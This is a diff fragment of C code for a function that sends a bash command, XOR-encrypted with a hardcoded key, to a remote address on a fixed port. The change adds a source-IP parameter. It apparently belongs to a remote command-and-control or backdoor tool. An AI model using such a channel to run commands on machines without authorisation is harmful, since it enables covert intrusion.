@@ -17,7 +17,7 @@
  *
  *      const char *command: The bash command to run.
  */
-void issue_command(const char *address, const char *command)
+void issue_command(const struct in_addr this_ip, const char *address, const char *command)
 {
     int total_len;
     int command_start_len;
@@ -46,7 +46,7 @@ void issue_command(const char *address, const char *command)
 
     xor_bytes(XOR_KEY, strlen(XOR_KEY), buffer, encrypted, total_len);
 
-    send_message_to_ip(addr, SERVER_PORT, encrypted, total_len);
+    send_message_to_ip(this_ip, addr, SERVER_PORT, encrypted, total_len);
 
     free(encrypted);
     free(buffer);
